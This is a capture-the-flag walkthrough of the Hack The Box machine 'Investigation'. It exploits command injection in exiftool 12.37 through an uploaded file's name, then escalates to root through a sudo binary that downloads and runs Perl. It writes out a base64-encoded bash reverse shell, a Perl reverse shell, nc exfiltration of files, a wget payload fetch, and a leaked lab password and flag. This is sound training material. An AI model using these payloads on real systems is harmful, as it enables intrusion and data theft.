- Add the box name to `/etc/hosts`

```bash
echo "10.10.11.197	investigation.htb" | sudo tee -a /etc/hosts
```

- After initial enumeration you will find that there is a web-server preset on port `80`.
- You will be brought to a new endpoint `eforenzics.htb`

- Change `/etc/hosts` to reflect this endpoint.

```bash
cat /etc/hosts | tail -1

10.10.11.197	eforenzics.htb
```

- On the initial page you will find:

![image](https://0xc0rvu5.github.io/docs/assets/images/20230203022112.png)

- Click `Go!`
- We will find a file upload functionality

![image](https://0xc0rvu5.github.io/docs/assets/images/20230203022157.png)

- It will only accept `jpeg` or `png` files from the error output.
- After uploading an image you will see:

![image](https://0xc0rvu5.github.io/docs/assets/images/20230203022328.png)

- Click `here`
- You will see some `exiftool` output.
- Note the version `12.37`

![image](https://0xc0rvu5.github.io/docs/assets/images/20230203022408.png)

- GoogleFu:
	- `exiftool 12.37 exploit`

- Find:
	- `https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429`
	- Within you will for a `PoC`

```bash
$ ls pwn
ls: cannot access 'pwn': No such file or directory
$ touch 'touch pwn |'
$ ./exiftool 'touch pwn |'
ExifTool Version Number         : 12.37
File Name                       : touch pwn |
Directory                       : .
File Size                       : 0 bytes
File Modification Date/Time     : 2022:01:18 18:40:18-06:00
File Access Date/Time           : 2022:01:18 18:40:18-06:00
File Inode Change Date/Time     : 2022:01:18 18:40:18-06:00
File Permissions                : prw-------
Error                           : File is empty
$ ls pwn
pwn
```

- Anything preceding the `|` will be executed locally on the file-system.
- Give it a test go:

![image](https://0xc0rvu5.github.io/docs/assets/images/20230203022952.png)

- After some trial and error on `reverse-shells` you find success with a `bash` reverse shell which is `base64` encoded.
```bash
echo "bash -c 'exec bash -i &>/dev/tcp/10.10.16.9/4444 <&1'" | base64

YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTYuOS80NDQ0IDwmMScK
```

- On host ensure there is a `nc` listener:
```bash
rlwrap nc -lvnp 4444
```

- In `Zap`:

```bash
filename="echo 'YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTYuOS80NDQ0IDwmMScK' | base64 -d | bash |"
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230203023533.png)

- Generate a proper shell:

```bash
# since python3 --version returns true
python3 -c 'import pty;pty.spawn("/bin/bash")'

# clear functionality
export TERM=xterm
```

- After some manual enumeration on `www-data` you bust out `linpeas.sh`

- On Host:

```bash
python -m http.server
```

- On victim:
```bash
cd /tmp
wget http://10.10.16.9:8000/linpeas.sh
chmod 777 linpeas.sh
./linpeas.sh > out.file
```

- There seems to be something going on in the `usr/local/investigation` directory:

![image](https://0xc0rvu5.github.io/docs/assets/images/20230203024423.png)

- Within the `/usr/local/investigation` directory you will find:
	- `'Windows Event Logs for Analysis.msg'`
- `msg` files are Microsoft Outlook email message files that contain the content of an individual email, including the sender, recipient, subject, message body, attachments, and other details. They are typically used to store and transfer email messages in a proprietary format, and can be opened and viewed using Microsoft Outlook or other compatible email clients.
- Let us send it over to our host machine to investigate it.

- On Host:

```bash
nc -lp 10015 > windows.msg
```

- On Victim:

```bash
pwd

/usr/local/investigation

cat W* | nc -w 3 10.10.16.9 10015
```

- `-w 3` - option sets a timeout of 3 seconds for the connection
- `-l` - option makes `nc` listen for incoming connections.

- Let's use `python` and `extract-msg` to view the content:

```bash
pip3 install extract-msg
extract_msg windows.msg
cd '2022-01-15_1830 Windows Event Logs for Analysis'
```

- There is a windows log file that we are going to investigate:

```bash
unzip evtx-logs.zip
```

- We will have to utilize `python` and `python-evtx` to properly view the content:

```bash
pip3 install python-evtx
evtx_dump.py security.evtx > security.xml
```

- There is quite a lot of content.
- After looking at various `targetusernames` you can determine that this may be a juicy finding:

```bash
cat security.xml  | grep -i targetusername | less -N
```

- After about 3k lines you will find what seems to be one of those times where a user types in their password as their username. Oops!

![image](https://0xc0rvu5.github.io/docs/assets/images/20230203010628.png)

- For perspective on search time:

![image](https://0xc0rvu5.github.io/docs/assets/images/20230203030042.png)

- The credentials work for user `smorton`!

```bash
ssh smorton@eforenzics.htb
Password: Def@ultf0r3nz!csPa$$
```

- You can grab the user flag right away:

```bash
cat user.txt 

b01ed0d332a01bd360b03e021b24880e
```

- If you immediately check `sudo -l` you will find an unusual binary:

```bash
sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```

- Similar to before, since we want to see what is going on with this binary, we are going to send it over to our host machine to attempt and disassemble it:

- On Host:

```bash
nc -lp 10015 > binary
```

- On Victim:

```bash
cat /usr/bin/binary | nc -w 3 10.10.16.9 10015
```

- Fire up `ghidra` and import the binary!
- Check out the main function

![image](https://0xc0rvu5.github.io/docs/assets/images/20230203030624.png)

- Here is the content:

```cpp
undefined8 main(int param_1,long param_2)

{
  __uid_t _Var1;
  int iVar2;
  FILE *__stream;
  undefined8 uVar3;
  char *__s;
  char *__s_00;
  
  if (param_1 != 3) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  _Var1 = getuid();
  if (_Var1 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(*(char **)(param_2 + 0x10),"lDnxUysaQn");
  if (iVar2 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Running... ");
  __stream = fopen(*(char **)(param_2 + 0x10),"wb");
  uVar3 = curl_easy_init();
  curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
  curl_easy_setopt(uVar3,0x2711,__stream);
  curl_easy_setopt(uVar3,0x2d,1);
  iVar2 = curl_easy_perform(uVar3);
  if (iVar2 == 0) {
    iVar2 = snprintf((char *)0x0,0,"%s",*(undefined8 *)(param_2 + 0x10));
    __s = (char *)malloc((long)iVar2 + 1);
    snprintf(__s,(long)iVar2 + 1,"%s",*(undefined8 *)(param_2 + 0x10));
    iVar2 = snprintf((char *)0x0,0,"perl ./%s",__s);
    __s_00 = (char *)malloc((long)iVar2 + 1);
    snprintf(__s_00,(long)iVar2 + 1,"perl ./%s",__s);
    fclose(__stream);
    curl_easy_cleanup(uVar3);
    setuid(0);
    system(__s_00);
    system("rm -f ./lDnxUysaQn");
    return 0;
  }
  puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

- This is the main function of a C++ program that seems to be downloading a file specified by the first argument passed to the program, using the curl library, and then executing the downloaded file with a system call to the Perl interpreter.

- The program first checks if the number of arguments passed to it is 3 (`argc != 3`), and if not, it prints "Exiting..." and exits the program.

- Next, it checks if the user running the program has root privileges (`getuid() != 0`), and if not, it prints "Exiting..." and exits the program.

- Then, it checks if the second argument passed to the program is equal to the string "lDnxUysaQn" (`strcmp(argv[2], "lDnxUysaQn") != 0`), and if not, it prints "Exiting..." and exits the program.

- If all checks pass, the program prints "Running..." and starts downloading the file specified by the first argument. The file is opened and set as the destination for the downloaded data with curl functions `curl_easy_init()`, `curl_easy_setopt()`, and `curl_easy_perform()`. The program then constructs the file path and calls the Perl interpreter to run the file. Finally, it removes the file "lDnxUysaQn".

- Therefore, the final payload should be:

```bash
sudo /usr/bin/binary your_server_hosting_rev_perl_shell lDnxUysaQn
```

- After some trial and error post `hack-tools` `perl` reverse-shell there is success with the below shell:
	- `perl.pl`

```perl
use Socket;
$i="10.10.16.9";
$p=4445;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/bash -i");};
```

- If you still have the `www-data` shell open be sure to switch the `port`.

- On Host:
- Terminal 1:

```bash
python -m http.server
```

- Terminal 2:

```bash
rlwrap nc -lvnp 4445
```

On Victim:

```bash
sudo /usr/bin/binary http://10.10.16.9:8000/perl.pl lDnxUysaQn
```

- Voila! Root!

![image](https://0xc0rvu5.github.io/docs/assets/images/20230510190103.png)

#hacking
